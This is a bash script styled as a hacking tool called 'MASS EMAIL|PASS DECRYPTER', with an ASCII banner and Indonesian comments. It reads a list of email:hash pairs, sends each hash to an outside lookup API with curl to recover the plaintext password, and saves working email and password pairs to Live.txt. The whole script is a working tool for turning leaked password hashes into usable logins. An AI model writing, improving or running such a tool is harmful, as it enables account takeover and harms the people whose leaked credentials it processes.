#!/bin/bash
#issued on : 17 agustus 2018
#coded By Arvan Apriyana
#re-coded By Dito Firmansyach
# w recode iyh by https://www.facebook.com/dito13.onion
waktu=$(date '+ %H:%M:%S')
HIJAU='\033[0;32m'
MERAH='\033[0;31m'
NORMAL='\033[0m'
CYAN='\033[0;36m'
BIRU='\033[0;34m'
PUTIH='\033[1;37m'
header(){
printf "${CYAN}
███████╗██╗██████╗ ███████╗███╗   ███╗ █████╗ ██╗      █████╗ ███████╗
██╔════╝██║██╔══██╗██╔════╝████╗ ████║██╔══██╗██║     ██╔══██╗██╔════╝
███████╗██║██████╔╝█████╗  ██╔████╔██║███████║██║     ███████║███████╗
╚════██║██║██╔═══╝ ██╔══╝  ██║╚██╔╝██║██╔══██║██║     ██╔══██║╚════██║
███████║██║██║     ███████╗██║ ╚═╝ ██║██║  ██║███████╗██║  ██║███████║
╚══════╝╚═╝╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
${PUTIH} ------------------------------------
     MASS EMAIL|PASS DECRYPTER
 ------------------------------------
        emaillo:passwordlo
"
}
scanskrng(){
    kocak="$1"
    cek=$(curl -s "https://lea.kz/api/hash/$2" -L | grep -Po '(?<="password":)[^,]*}' | tr -d '[]"}') #apinya
    if [[ ! $cek =~ "sipemalas" ]]; then
    printf " ${HIJAU}LIVE | ${GREEN}$1| $cek\n"

    echo "$1 |$cek" >> Live.txt
           else
    printf " ${MERAH}NOT FOUND${NC} => $cek\n"
fi

}
header
printf "${PUTIH}══════════════════════════════════════════════════════════════════════${NC}\n\n"
#Select mailist from


ls *.txt
printf "${PUTIH}══════════════════════════════════════════════════════════════════════${NC}\n\n"
echo -n " Put Your List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emaillo=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordlo=($y)'
    for (( i = 0; i < "${#emaillo[@]}"; i++ )); do
    em="${emaillo[$i]}"
    pw="${passwordlo[$i]}"
        scanskrng $em $pw
done
